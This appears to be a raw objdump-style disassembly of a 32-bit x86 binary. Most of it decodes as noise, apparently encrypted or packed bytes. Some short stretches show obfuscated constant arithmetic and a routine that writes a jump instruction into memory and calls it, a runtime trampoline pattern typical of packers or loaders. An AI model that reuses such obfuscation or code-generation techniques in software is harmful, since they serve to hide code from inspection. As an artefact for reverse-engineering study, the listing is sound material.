  4100aa:	mov    al,ds:0x7dfb3a0c
  4100af:	xchg   edi,eax
  4100b0:	mov    BYTE PTR [ebx],al
  4100b2:	fs push ebp
  4100b4:	aam    0xd2
  4100b6:	dec    esp
  4100b7:	imul   edi,DWORD PTR ds:0x959f6466,0x10e21f41
  4100c1:	jno    0x410048
  4100c3:	outs   dx,DWORD PTR ds:[esi]
  4100c4:	xor    bh,ah
  4100c6:	xor    BYTE PTR [eax-0x62],0x13
  4100ca:	test   eax,0x89c5eb06
  4100cf:	fdivr  QWORD PTR [esi-0x7a9165b0]
  4100d5:	sub    DWORD PTR [edi+0x3],0x6848a15d
  4100dc:	xchg   edi,eax
  4100dd:	pop    ecx
  4100de:	and    ebp,edi
  4100e0:	call   0x856e5a92
  4100e5:	inc    ebp
  4100e6:	aam    0xcf
  4100e8:	cdq    
  4100e9:	ins    BYTE PTR es:[edi],dx
  4100ea:	xor    al,ah
  4100ec:	lds    eax,FWORD PTR [ebx-0xc]
  4100ef:	test   al,0xba
  4100f1:	xor    ah,BYTE PTR [edi+0x7ccaf22b]
  4100f7:	jl     0x4100ac
  4100f9:	cmp    DWORD PTR [eax],edx
  4100fb:	rcl    BYTE PTR [ebp-0x7e9379b6],0x46
  410102:	pop    eax
  410103:	push   es
  410104:	sub    eax,0x91ad40f7
  410109:	and    ebp,esp
  41010b:	lds    ecx,FWORD PTR [esi]
  41010d:	sub    esp,DWORD PTR [edi-0x6c]
  410110:	out    dx,eax
  410111:	shl    BYTE PTR ds:0x38b40fe,0xe8
  410118:	mov    ds:0x7f4e9c99,al
  41011d:	mov    dh,0x6e
  41011f:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410121:	sbb    eax,0x1a47f060
  410126:	outs   dx,DWORD PTR ds:[esi]
  410127:	and    ah,BYTE PTR [ecx]
  410129:	js     0x41018e
  41012b:	xchg   ebp,eax
  41012c:	into   
  41012d:	repz xchg edi,eax
  41012f:	mov    dl,0x9a
  410131:	iret   
  410132:	sbb    dh,bl
  410134:	xor    bl,dl
  410136:	pop    esp
  410137:	jnp    0x4100dc
  410139:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41013a:	mov    ds:0xceb6c91d,eax
  41013f:	aaa    
  410140:	xor    al,0x1a
  410142:	jbe    0x410139
  410144:	xchg   esp,eax
  410145:	add    al,0x7
  410147:	std    
  410148:	xchg   ecx,eax
  410149:	icebp  
  41014a:	(bad)
  41014d:	adc    al,BYTE PTR [ecx]
  41014f:	xchg   edi,eax
  410150:	push   ss
  410151:	fidivr WORD PTR ds:0xdaa70ca3
  410157:	inc    ebx
  410158:	push   edi
  410159:	push   edx
  41015a:	fist   WORD PTR [edi+edi*2+0x55e58c3c]
  410161:	inc    ecx
  410162:	call   0x50931aa7
  410167:	daa    
  410168:	add    al,0x5
  41016a:	sub    al,0x99
  41016c:	popf   
  41016d:	push   eax
  41016e:	mov    al,0x51
  410170:	ja     0x4101a4
  410172:	not    DWORD PTR [ebp+0x136d18d4]
  410178:	test   al,0x86
  41017a:	xor    ecx,DWORD PTR [eax]
  41017c:	mov    ch,0x56
  41017e:	or     al,0xab
  410180:	stos   BYTE PTR es:[edi],al
  410181:	push   esp
  410182:	xor    edx,DWORD PTR [edx+0x444b96d5]
  410188:	or     eax,0xd8231892
  41018d:	dec    eax
  41018e:	loop   0x4101be
  410190:	scas   al,BYTE PTR es:[edi]
  410191:	push   ebp
  410192:	mov    dl,0x12
  410194:	cmp    ah,BYTE PTR [edi+0x4dc145fb]
  41019a:	sbb    DWORD PTR [esi+edx*4-0xd3c12d1],esp
  4101a1:	xchg   esi,eax
  4101a2:	retf   0xb249
  4101a5:	jbe    0x4101e9
  4101a7:	pop    esp
  4101a8:	pop    edx
  4101a9:	dec    esi
  4101aa:	popf   
  4101ab:	inc    ebp
  4101ac:	add    DWORD PTR [esi-0x442c203c],edi
  4101b2:	into   
  4101b3:	jb     0x410173
  4101b5:	es sar ebp,0x74
  4101b9:	lods   al,BYTE PTR ds:[esi]
  4101ba:	int3   
  4101bb:	sti    
  4101bc:	iret   
  4101bd:	data16 stos BYTE PTR es:[edi],al
  4101bf:	(bad)  
  4101c0:	(bad)  
  4101c1:	or     DWORD PTR [ebx],esp
  4101c3:	push   eax
  4101c4:	into   
  4101c5:	ret    
  4101c6:	sub    DWORD PTR [ebx],edx
  4101c8:	xlat   BYTE PTR ds:[ebx]
  4101c9:	adc    DWORD PTR [esp+edi*8],ebx
  4101cc:	fidivr WORD PTR [ecx+0x5f]
  4101cf:	int3   
  4101d0:	test   DWORD PTR [edx+0x1e],edi
  4101d3:	sub    eax,0x118186b
  4101d8:	xlat   BYTE PTR ds:[ebx]
  4101d9:	inc    DWORD PTR [ebx+0x1f796a1]
  4101df:	add    DWORD PTR [esi+0x40f632f6],edx
  4101e5:	add    eax,0x70f12b25
  4101ea:	loope  0x410225
  4101ec:	(bad)  
  4101ed:	popf   
  4101ee:	pop    ds
  4101ef:	or     BYTE PTR [ecx+0x7e],al
  4101f2:	(bad)  
  4101f3:	idiv   DWORD PTR [ecx+0x68]
  4101f6:	xchg   ecx,eax
  4101f7:	cmp    dl,BYTE PTR [ebp-0x4a]
  4101fa:	dec    ecx
  4101fb:	xchg   BYTE PTR [esi-0x2aa6b338],dh
  410201:	mov    al,ds:0xea360555
  410206:	cmp    eax,0x8c168d6d
  41020b:	stc    
  41020c:	adc    eax,0xd3e19997
  410211:	or     eax,0x97f2050e
  410216:	scas   eax,DWORD PTR es:[edi]
  410217:	sub    al,0x96
  410219:	sub    al,0x80
  41021b:	dec    edi
  41021c:	push   ecx
  41021d:	dec    esi
  41021e:	xor    BYTE PTR [ebp+0x4e],ch
  410221:	add    esp,DWORD PTR [eax]
  410223:	test   BYTE PTR [edi],0x85
  410226:	xor    eax,0x8b000004
  41022b:	dec    ebp
  41022c:	mov    BYTE PTR [ebx],dh
  41022e:	sar    BYTE PTR [eax+0x209c],cl
  410234:	div    ecx
  410236:	mov    ecx,DWORD PTR ds:0x422538
  41023c:	mov    ecx,DWORD PTR [ecx+0x1a8]
  410242:	xor    edx,edx
  410244:	sub    ecx,eax
  410246:	mov    eax,DWORD PTR [ebp-0x4c]
  410249:	xor    eax,0x3daa
  41024e:	sub    eax,0x3375
  410253:	or     eax,0x6931
  410258:	lea    eax,[ebp+eax*1-0x6c25]
  41025f:	push   eax
  410260:	mov    eax,DWORD PTR [ebp-0x8c]
  410266:	push   0x18
  410268:	pop    esi
  410269:	div    esi
  41026b:	mov    esi,DWORD PTR [ebp-0x60]
  41026e:	xor    edx,edx
  410270:	div    esi
  410272:	mov    edx,DWORD PTR [ebp-0x44]
  410275:	mov    esi,DWORD PTR [ebp-0x34]
  410278:	xor    eax,edx
  41027a:	xor    edx,edx
  41027c:	div    esi
  41027e:	imul   eax,eax,0x7d2a
  410284:	sub    eax,0x928ded7
  410289:	push   eax
  41028a:	mov    eax,ds:0x422538
  41028f:	add    eax,0xaa
  410294:	push   eax
  410295:	mov    eax,DWORD PTR [ebp-0x3c]
  410298:	sub    ecx,eax
  41029a:	mov    eax,DWORD PTR [ebp-0x24]
  41029d:	push   DWORD PTR [ecx+eax*1+0xbd4]
  4102a4:	call   0x41e9f9
  4102a9:	mov    DWORD PTR [ebp-0x4],eax
  4102ac:	mov    ecx,DWORD PTR ds:0x422640
  4102b2:	lea    eax,[ebp+0x4]
  4102b5:	mov    DWORD PTR [ecx*4+0x422638],eax
  4102bc:	inc    DWORD PTR ds:0x422640
  4102c2:	mov    eax,DWORD PTR [ebp-0x4]
  4102c5:	mov    eax,DWORD PTR [ebp-0x4]
  4102c8:	xor    edx,edx
  4102ca:	shld   edx,eax,0x2
  4102ce:	shl    eax,0x2
  4102d1:	mov    ecx,0xca79a575
  4102d6:	mov    esi,0x9c1b89e8
  4102db:	xor    eax,ecx
  4102dd:	xor    edx,esi
  4102df:	cmp    eax,ecx
  4102e1:	jne    0x4105c9
  4102e7:	cmp    edx,esi
  4102e9:	jne    0x4105c9
  4102ef:	mov    eax,0xca79a571
  4102f4:	mov    edx,esi
  4102f6:	jmp    0x410669
  4102fb:	jmp    0x4105c9
  410300:	sbb    al,0xfc
  410302:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410303:	fs sbb bl,BYTE PTR es:[edx]
  410307:	mov    ebp,0x70cf8d86
  41030c:	ret    0x53ac
  41030f:	stos   BYTE PTR es:[edi],al
  410310:	ret    
  410311:	xchg   edx,eax
  410312:	sbb    BYTE PTR [eax],bl
  410314:	mov    esi,0x18181814
  410319:	xchg   ecx,eax
  41031a:	or     DWORD PTR [edi],esp
  41031c:	adc    ebx,DWORD PTR [edi-0x58]
  41031f:	sub    DWORD PTR [ecx+0x7f],esi
  410322:	push   esi
  410323:	sar    DWORD PTR [eax-0x60],1
  410326:	pop    ecx
  410327:	or     dh,al
  410329:	and    al,0x49
  41032b:	dec    ebp
  41032c:	mov    al,ds:0xb98d37a4
  410331:	xlat   BYTE PTR ds:[ebx]
  410332:	js     0x41034b
  410334:	and    dh,BYTE PTR [ecx-0x2a]
  410337:	xor    DWORD PTR gs:[eax-0x27],ebx
  41033b:	push   eax
  41033c:	jp     0x410310
  41033e:	jge    0x4102e0
  410340:	adc    al,0x4b
  410342:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410343:	sbb    dh,al
  410345:	mov    dh,0x41
  410347:	fidiv  DWORD PTR [ecx]
  410349:	cmc    
  41034a:	lods   eax,DWORD PTR ds:[esi]
  41034b:	fmul   QWORD PTR [ecx+0x12]
  41034e:	push   edi
  41034f:	ficomp WORD PTR [eax]
  410351:	sub    al,0x16
  410353:	xor    BYTE PTR [edi+0x7b1ec8c2],ch
  410359:	push   0x20
  41035b:	mov    gs,WORD PTR [ebx-0x35be0104]
  410361:	sahf   
  410362:	mov    ds:0x3dd21bd,eax
  410367:	push   edx
  410368:	add    al,0x34
  41036a:	push   cs
  41036b:	inc    edi
  41036c:	jbe    0x4103ad
  41036e:	push   esp
  41036f:	cld    
  410370:	fmulp  st(7),st
  410372:	dec    ebp
  410373:	cmp    edi,eax
  410375:	out    dx,al
  410376:	mov    dh,0xb7
  410378:	hlt    
  410379:	test   dl,ch
  41037b:	jmp    0x60c200e0
  410380:	and    BYTE PTR [esi-0x7d],cl
  410383:	sbb    DWORD PTR ds:0x16216ce4,esi
  410389:	call   0xecfe:0xc069f6f6
  410390:	test   al,0xf2
  410392:	dec    ebp
  410393:	(bad)  
  410394:	jmp    0x93c057fc
  410399:	push   0x45
  41039b:	aam    0xe1
  41039d:	jp     0x41040b
  41039f:	out    dx,al
  4103a0:	repz xchg ecx,eax
  4103a2:	xor    eax,0xbe87a46e
  4103a7:	mov    eax,0x42dbe17d
  4103ac:	call   0x85cdcb93
  4103b1:	lahf   
  4103b2:	push   cs
  4103b3:	jns    0x4103e4
  4103b5:	rcr    ecx,cl
  4103b7:	aad    0x42
  4103b9:	bound  esi,QWORD PTR [edx-0x6b365c49]
  4103bf:	bound  esp,QWORD PTR [edx+0x40]
  4103c2:	int3   
  4103c3:	cli    
  4103c4:	mov    dh,0x91
  4103c6:	push   ebp
  4103c7:	sahf   
  4103c8:	enter  0xf0fd,0x2e
  4103cc:	jge    0x410449
  4103ce:	std    
  4103cf:	das    
  4103d0:	hlt    
  4103d1:	adc    ecx,DWORD PTR [eax-0x55]
  4103d4:	enter  0xf8ec,0x6c
  4103d8:	cs cwde 
  4103da:	adc    eax,0x903b866b
  4103df:	xor    BYTE PTR [ebp-0x7931ec1c],al
  4103e5:	mov    bh,0xdb
  4103e7:	(bad)  
  4103e9:	mov    es,ecx
  4103eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4103ec:	shl    DWORD PTR [ecx],cl
  4103ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103ef:	out    dx,eax
  4103f0:	sub    DWORD PTR [ecx-0x30078ced],0xffffffe4
  4103f7:	dec    edi
  4103f8:	jae    0x410458
  4103fa:	sub    al,BYTE PTR [edx]
  4103fc:	mov    edx,0xc967d0ab
  410401:	cmc    
  410402:	mov    dh,0xbe
  410404:	jb     0x4103ef
  410406:	out    dx,eax
  410407:	mov    edi,0xde2766d7
  41040c:	(bad)  
  41040d:	lods   eax,DWORD PTR ds:[esi]
  41040e:	mov    edi,0xb4ed8bb1
  410413:	sub    eax,0x8d4c2b4a
  410418:	inc    ecx
  410419:	adc    eax,0x19d9f940
  41041e:	jne    0x41044b
  410420:	pop    edx
  410421:	push   ebx
  410422:	in     al,0x96
  410424:	inc    esi
  410425:	(bad)  
  410426:	test   al,0x9d
  410428:	mov    bh,0xd9
  41042a:	dec    ecx
  41042b:	test   eax,0x62554572
  410430:	lods   eax,DWORD PTR ds:[esi]
  410431:	in     al,0x29
  410433:	fcmovnbe st,st(5)
  410435:	adc    eax,0x8bfc6528
  41043a:	lods   al,BYTE PTR ds:[esi]
  41043b:	pop    esi
  41043c:	or     eax,DWORD PTR [ebx+0x4b453407]
  410442:	dec    ebp
  410443:	xor    esi,ebx
  410445:	cli    
  410446:	out    0x54,eax
  410448:	jg     0x410426
  41044a:	hlt    
  41044b:	imul   ecx,DWORD PTR [esi-0xea52bde],0x3a
  410452:	cmp    al,0xa2
  410454:	jbe    0x4103dd
  410456:	pop    ds
  410457:	xchg   ebx,eax
  410458:	push   es
  410459:	sbb    DWORD PTR es:[eax-0x3f1d656a],eax
  410460:	cmp    esi,DWORD PTR ds:0x56eafac0
  410466:	mov    ecx,0xe72a965a
  41046b:	loopne 0x4103f8
  41046d:	(bad)  
  41046e:	std    
  41046f:	push   0x8b7795c3
  410474:	imul   edx,DWORD PTR ds:0x2f361e20,0xc611d2eb
  41047e:	mov    ds:0x1415bd9a,al
  410483:	xchg   ebp,eax
  410484:	mov    ch,0x16
  410486:	fldenv [ecx-0x46]
  410489:	retf   0xf4f3
  41048c:	scas   al,BYTE PTR es:[edi]
  41048d:	rol    DWORD PTR [edi+eax*1+0x7],1
  410491:	call   0xdbf92da0
  410496:	and    esp,DWORD PTR [eax-0x5b]
  410499:	inc    ebx
  41049a:	xchg   ebx,eax
  41049b:	and    eax,DWORD PTR [ebx+0x4d491691]
  4104a1:	in     eax,0x19
  4104a3:	popf   
  4104a4:	push   0x8c4f4bb3
  4104a9:	arpl   WORD PTR [edi-0x73],ax
  4104ac:	mov    esi,DWORD PTR [ebx+0x2bcc2dc6]
  4104b2:	iret   
  4104b3:	data16 (bad) 
  4104b6:	jmp    0x410505
  4104b8:	sbb    DWORD PTR es:[eax-0x1af43124],eax
  4104bf:	fisttp WORD PTR [ecx+ebp*2]
  4104c2:	or     eax,0x6a3ec84f
  4104c7:	arpl   WORD PTR [ebp-0x6],bp
  4104ca:	pusha  
  4104cb:	inc    ebx
  4104cc:	clc    
  4104cd:	pop    esp
  4104ce:	mov    ah,0x45
  4104d0:	outs   dx,DWORD PTR ds:[esi]
  4104d1:	ret    
  4104d2:	les    esi,FWORD PTR [eax+0x3deb0cbc]
  4104d8:	pop    esi
  4104d9:	cmp    bh,BYTE PTR [edi+ebp*2+0x7bea2c59]
  4104e0:	pop    eax
  4104e1:	stos   DWORD PTR es:[edi],eax
  4104e2:	push   ds
  4104e3:	int    0x40
  4104e5:	sahf   
  4104e6:	add    ch,BYTE PTR ds:0x6c59f259
  4104ec:	xchg   esi,eax
  4104ed:	push   eax
  4104ee:	loope  0x4104df
  4104f0:	int    0xf9
  4104f2:	sbb    edx,DWORD PTR ss:[ebp+0x57a419ca]
  4104f9:	mov    edi,0x1f6e1c22
  4104fe:	rol    dh,cl
  410500:	xchg   ecx,eax
  410501:	out    0x74,al
  410503:	mul    DWORD PTR [esi+0x5e]
  410506:	inc    ebp
  410507:	pop    eax
  410508:	lock push edi
  41050a:	lds    edx,FWORD PTR [ebp+0x25e337fd]
  410510:	mov    bh,BYTE PTR [edi-0x3a]
  410513:	sub    eax,DWORD PTR [ebx-0x73]
  410516:	push   es
  410517:	jbe    0x410587
  410519:	sub    dh,dl
  41051b:	inc    edi
  41051c:	dec    edx
  41051d:	cmp    DWORD PTR [edi+0x1f],ecx
  410520:	mov    bl,0x4
  410522:	push   cs
  410523:	icebp  
  410524:	xchg   ecx,eax
  410525:	mov    dl,0x7a
  410527:	mov    al,0x69
  410529:	loope  0x4104dc
  41052b:	fcom   DWORD PTR [edx+0x15]
  41052e:	mov    esi,0xe5dc5401
  410533:	inc    esp
  410534:	fld    TBYTE PTR [ebx-0x423c361c]
  41053a:	data16 or BYTE PTR [edi-0x39],ch
  41053e:	pop    ebp
  41053f:	inc    edx
  410540:	ds loop 0x4104fc
  410543:	pop    es
  410544:	rol    BYTE PTR [ebp-0x73],0x3
  410548:	inc    ecx
  410549:	pop    ecx
  41054a:	cs xchg ebp,ebx
  41054d:	and    dl,ch
  41054f:	call   0xc4b7974d
  410554:	cmp    al,0x33
  410556:	add    DWORD PTR [edi+0x11],0xffffffa0
  41055a:	outs   dx,DWORD PTR ds:[esi]
  41055b:	call   0xa0ad:0x38e76e65
  410562:	das    
  410563:	pop    edx
  410564:	and    edx,DWORD PTR ds:0x4f484981
  41056a:	cmp    esp,eax
  41056c:	icebp  
  41056d:	aad    0xf7
  41056f:	pop    ebp
  410570:	iret   
  410571:	int    0x26
  410573:	fdiv   st,st(7)
  410575:	xchg   ecx,eax
  410576:	int    0x21
  410578:	lods   al,BYTE PTR ds:[esi]
  410579:	out    0x8b,eax
  41057b:	mov    eax,0x2842edd6
  410580:	sub    al,0xc1
  410582:	pop    edx
  410583:	xchg   ebp,eax
  410584:	(bad)  
  410585:	jecxz  0x410569
  410587:	std    
  410588:	push   ecx
  410589:	mov    al,ds:0x81269c85
  41058e:	mov    esi,0xbc79306a
  410593:	imul   ebx,DWORD PTR [edx-0x74],0xffffffa5
  410597:	cmp    dh,BYTE PTR [si+0x71]
  41059b:	cdq    
  41059c:	add    DWORD PTR ds:[ecx],ebx
  41059f:	sub    ebx,DWORD PTR [edx-0x6d012f83]
  4105a5:	xchg   edi,eax
  4105a6:	(bad)  
  4105a7:	js     0x4105c3
  4105a9:	ins    BYTE PTR es:[edi],dx
  4105aa:	push   ebx
  4105ab:	sub    al,0x5a
  4105ad:	dec    esi
  4105ae:	mov    bh,0x1e
  4105b0:	pop    ds
  4105b1:	rcl    BYTE PTR [eax],1
  4105b3:	mov    ch,0x6b
  4105b5:	pop    esi
  4105b6:	ins    BYTE PTR es:[edi],dx
  4105b7:	cmp    eax,0xe72b7182
  4105bc:	enter  0x4730,0xd
  4105c0:	stos   BYTE PTR es:[edi],al
  4105c1:	add    edi,DWORD PTR [edx]
  4105c3:	mov    ah,0xe7
  4105c5:	mov    ebx,0x8dc8dcfc
  4105ca:	inc    ebp
  4105cb:	lock mov DWORD PTR [ebp-0x9c],eax
  4105d2:	mov    eax,DWORD PTR [ebp-0x54]
  4105d5:	mov    DWORD PTR [ebp-0x10],eax
  4105d8:	mov    eax,DWORD PTR [ebp-0x10]
  4105db:	mov    ecx,DWORD PTR [ebp-0x4]
  4105de:	sub    eax,ecx
  4105e0:	mov    DWORD PTR [ebp-0x10],eax
  4105e3:	mov    eax,DWORD PTR [ebp-0x20]
  4105e6:	mov    ecx,DWORD PTR [ebp-0x1c]
  4105e9:	sub    DWORD PTR [ebp-0x10],eax
  4105ec:	mov    eax,DWORD PTR [ebp-0x4]
  4105ef:	mov    DWORD PTR [eax],0x658776e9
  4105f5:	mov    DWORD PTR [eax+0x4],0xab756547
  4105fc:	mov    eax,DWORD PTR [ebp-0x10]
  4105ff:	mov    ecx,DWORD PTR [ebp-0x4]
  410602:	mov    DWORD PTR [ecx+0x1],eax
  410605:	mov    eax,ds:0x4223b4
  41060a:	push   DWORD PTR [eax]
  41060c:	push   DWORD PTR ds:0x422628
  410612:	push   DWORD PTR ds:0x4223bc
  410618:	push   DWORD PTR ds:0x422608
  41061e:	push   DWORD PTR ds:0x42267c
  410624:	push   0xa4069aaa
  410629:	push   0xa4069aae
  41062e:	push   DWORD PTR [ebp-0x5c]
  410631:	mov    eax,DWORD PTR [ebp-0x4]
  410634:	call   eax
  410636:	mov    eax,DWORD PTR [edi]
  410638:	mov    eax,DWORD PTR [ebp+0x8]
  41063b:	push   DWORD PTR [eax]
  41063d:	call   0x4110ff
  410642:	mov    eax,ds:0x422538
  410647:	push   0x4
  410649:	add    eax,0x1dc
  41064e:	push   eax
  41064f:	push   edi
  410650:	call   0x415231
  410655:	mov    eax,0xca79a57d
  41065a:	jmp    0x4102f4
  41065f:	mov    eax,0xca79a575
  410664:	mov    edx,0x9c1b89e8
  410669:	pop    esi
  41066a:	pop    ebx
  41066b:	leave  
  41066c:	ret    0x4
  41066f:	push   ebp
  410670:	mov    ebp,esp
  410672:	sub    esp,0x20
  410675:	push   ebx
  410676:	push   edi
  410677:	mov    DWORD PTR [ebp-0x8],0x522e
  41067e:	mov    DWORD PTR [ebp-0x4],0x3dbd
  410685:	mov    DWORD PTR [ebp-0x10],0x53f1
  41068c:	mov    DWORD PTR [ebp-0xc],0x631b
  410693:	mov    DWORD PTR [ebp-0x18],0x524d
  41069a:	mov    DWORD PTR [ebp-0x14],0x1600
  4106a1:	mov    eax,DWORD PTR [ebp-0x18]
  4106a4:	mov    ecx,DWORD PTR [ebp-0x14]
  4106a7:	mov    edx,DWORD PTR [ebp-0x10]
  4106aa:	mov    edi,DWORD PTR [ebp-0xc]
  4106ad:	push   edi
  4106ae:	push   edx
  4106af:	push   ecx
  4106b0:	push   eax
  4106b1:	call   0x416c20
  4106b6:	mov    ecx,DWORD PTR [ebp-0x8]
  4106b9:	mov    edi,DWORD PTR [ebp-0x4]
  4106bc:	add    eax,0x1dc8
  4106c1:	adc    edx,0x6fbf
  4106c7:	and    edx,edi
  4106c9:	push   0x1061
  4106ce:	and    eax,ecx
  4106d0:	or     edx,0x23ff
  4106d6:	push   0x4000022f
  4106db:	jmp    0x4109bb
  4106e0:	pop    edi
  4106e1:	jp     0x410689
  4106e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106e4:	mov    ds:0x103a5b1c,al
  4106e9:	fsub   QWORD PTR [edi-0x44]
  4106ec:	hlt    
  4106ed:	or     BYTE PTR [ebp+0x188e687c],al
  4106f3:	sbb    BYTE PTR [edx+0x4e181814],bl
  4106f9:	pushf  
  4106fa:	mov    ebp,0x47c9f0de
  4106ff:	mov    ?,WORD PTR [ebp-0x4f66789]
  410705:	pop    esp
  410706:	xor    BYTE PTR [edx-0x7652b9c6],dl
  41070c:	and    al,0xe0
  41070e:	ds mov esi,cs
  410711:	sub    eax,0x939f435c
  410716:	pop    edi
  410717:	ss jno 0x410793
  41071a:	fwait
  41071b:	out    dx,al
  41071c:	jl     0x4106bc
  41071e:	stos   DWORD PTR es:[edi],eax
  41071f:	inc    ebp
  410720:	mov    esp,ebp
  410722:	sbb    edi,DWORD PTR [edx+eiz*2+0x2b]
  410726:	call   0xe11d0ec2
  41072b:	cwde   
  41072c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41072d:	leave  
  41072e:	lahf   
  41072f:	jae    0x4106d6
  410731:	dec    ecx
  410732:	es push 0xffffffdf
  410735:	sar    cl,1
  410737:	int    0x8d
  410739:	mov    esp,0x513df808
  41073e:	in     al,dx
  41073f:	lods   eax,DWORD PTR ds:[esi]
  410740:	sbb    al,0x2a
  410742:	loop   0x41072b
  410744:	out    dx,eax
  410745:	xchg   ebx,eax
  410746:	mov    dh,0x5
  410748:	nop
  410749:	in     eax,0x54
  41074b:	sbb    dh,ah
  41074d:	push   esi
  41074e:	shl    DWORD PTR [edx+edx*4],cl
  410751:	test   DWORD PTR [edx],ebx
  410753:	jmp    0xbb1f:0xe5ff4cc3
  41075a:	dec    esi
  41075b:	sbb    DWORD PTR [ecx],ecx
  41075d:	ror    BYTE PTR [ebp-0x72],0xdb
  410761:	or     BYTE PTR [edx-0x17c8bb63],bh
  410767:	iret   
  410768:	mov    ds:0xed2d800e,al
  41076d:	adc    BYTE PTR [eax],cl
  41076f:	sub    al,0x97
  410771:	stos   DWORD PTR es:[edi],eax
  410772:	mov    ebp,0xa3dbe377
  410777:	push   esi
  410778:	mov    bh,0x5c
  41077a:	lds    ebx,FWORD PTR ds:0xc7f81bec
  410780:	or     DWORD PTR [esi+edx*8+0x12f3be7b],edi
  410787:	in     eax,0x23
  410789:	sbb    ecx,DWORD PTR fs:[esi]
  41078c:	xchg   ebx,eax
  41078d:	(bad)  
  41078e:	retf   0x4cc9
  410791:	(bad)  
  410792:	xlat   BYTE PTR ds:[ebx]
  410793:	dec    esi
  410794:	add    dh,bh
  410796:	mov    dh,0x9b
  410798:	je     0x4107d6
  41079a:	jmp    0x410764
  41079c:	dec    ecx
  41079d:	fbld   TBYTE PTR [eax-0x7ece2ec3]
  4107a3:	fs popf 
  4107a5:	xchg   ebx,eax
  4107a6:	out    0xc0,al
  4107a8:	cmp    BYTE PTR [edx+0x7b],dl
  4107ab:	dec    esi
  4107ac:	cs jmp 0x3e72:0x33ea4c0d
  4107b4:	and    DWORD PTR [edx],eax
  4107b6:	icebp  
  4107b7:	push   esp
  4107b8:	push   edi
  4107b9:	lea    edx,[edx]
  4107bb:	sbb    BYTE PTR [edx-0x3b],ah
  4107be:	lods   eax,DWORD PTR ds:[esi]
  4107bf:	xchg   ebp,eax
  4107c0:	ret    
  4107c1:	pop    eax
  4107c2:	lods   eax,DWORD PTR ds:[esi]
  4107c3:	scas   eax,DWORD PTR es:[edi]
  4107c4:	mov    ah,0x6c
  4107c6:	(bad)  
  4107c8:	sbb    ah,BYTE PTR [esi+0x5e957910]
  4107ce:	rep outs dx,DWORD PTR ds:[esi]
  4107d0:	outs   dx,DWORD PTR ds:[esi]
  4107d1:	mov    ch,0xa5
  4107d3:	inc    esp
  4107d4:	xor    DWORD PTR [ecx],0x1f
  4107d7:	fs push ebx
  4107d9:	xchg   esp,eax
  4107da:	xchg   esp,eax
  4107db:	mov    cs,eax
  4107dd:	jle    0x410788
  4107df:	dec    ecx
  4107e0:	mov    eax,0x591abc45
  4107e5:	ins    BYTE PTR es:[edi],dx
  4107e6:	fsubr  DWORD PTR [eax-0x4ce90338]
  4107ec:	xchg   DWORD PTR [ebx-0x27],edx
  4107ef:	ins    BYTE PTR es:[edi],dx
  4107f0:	mov    cs,ebx
  4107f2:	jg     0x4107b1
  4107f4:	mov    esp,0xc360c93a
  4107f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107fb:	sbb    al,0xea
  4107fd:	idiv   BYTE PTR [edi+0x5f]
  410800:	xchg   edx,eax
  410801:	lahf   
  410802:	out    dx,eax
  410803:	xlat   BYTE PTR ds:[ebx]
  410804:	adc    ch,ah
  410806:	pop    esi
  410807:	cmp    edi,DWORD PTR [eax]
  410809:	clc    
  41080a:	jo     0x4107cb
  41080c:	cmc    
  41080d:	mov    al,0xb1
  41080f:	jp     0x41085f
  410811:	out    dx,al
  410812:	shl    DWORD PTR [esi-0x18],0x7e
  410816:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410817:	not    DWORD PTR [esi+0x71]
  41081a:	repz push 0xe900f46b
  410820:	add    al,0x1a
  410822:	ins    DWORD PTR es:[edi],dx
  410823:	mov    esi,0xfe0f4f97
  410828:	xor    DWORD PTR [edi-0x61cb43dd],0x4c
  41082f:	std    
  410830:	packsswb mm0,QWORD PTR [eax+0x63d25160]
  410837:	pop    eax
  410838:	jo     0x410820
  41083a:	push   edi
  41083b:	push   0xffffffb1
  41083d:	and    eax,0x2c92cf00
  410842:	loope  0x410889
  410844:	xchg   esi,eax
  410845:	jo     0x410899
  410847:	in     eax,dx
  410848:	fnstsw WORD PTR [esp+ebx*2-0x30]
  41084c:	mov    WORD PTR [edx-0x7fcfae24],cs
  410852:	mov    dl,0x37
  410854:	cmc    
  410855:	adc    eax,0xb2f3b9fa
  41085a:	pop    ebx
  41085b:	jge    0x410888
  41085d:	push   edx
  41085e:	outs   dx,BYTE PTR ds:[esi]
  41085f:	inc    edx
  410860:	test   eax,0xb7c36fe5
  410865:	popf   
  410866:	adc    ebp,DWORD PTR [edi-0x5ec2fa54]
  41086c:	ja     0x4108e6
  41086e:	ror    BYTE PTR [edi],0xaf
  410871:	in     al,dx
  410872:	xchg   esp,eax
  410873:	mov    ?,WORD PTR [esi-0x2bac780c]
  410879:	popa   
  41087a:	sti    
  41087b:	xor    al,0xec
  41087d:	inc    esi
  41087e:	mov    ah,0x7a
  410880:	pop    eax
  410881:	scas   al,BYTE PTR es:[edi]
  410882:	adc    eax,0xda98f7ca
  410887:	push   0x231dd6fb
  41088c:	stos   BYTE PTR es:[edi],al
  41088d:	dec    esi
  41088e:	mov    ebp,0xd71609f7
  410893:	sub    al,0xf8
  410895:	out    0xe1,eax
  410897:	xchg   esp,eax
  410898:	add    al,0xf7
  41089a:	nop
  41089b:	out    0x31,al
  41089d:	mov    BYTE PTR [ecx-0x5a759ec4],bh
  4108a3:	and    al,al
  4108a5:	lods   al,BYTE PTR ds:[esi]
  4108a6:	mov    esi,0x74e517e7
  4108ab:	push   esi
  4108ac:	call   0xce28:0x497b7ea0
  4108b3:	dec    ebp
  4108b4:	pop    ss
  4108b5:	imul   edi,edx,0xfffffff9
  4108b8:	jns    0x410845
  4108ba:	ficom  WORD PTR [ebp+ebx*8+0x23f8176]
  4108c1:	adc    BYTE PTR ds:0x89fd0642,ah
  4108c7:	leave  
  4108c8:	sub    eax,0xd86653c3
  4108cd:	sub    eax,0xb7421480
  4108d2:	mov    eax,0x625eb337
  4108d7:	test   DWORD PTR [eax+ebp*2],ecx
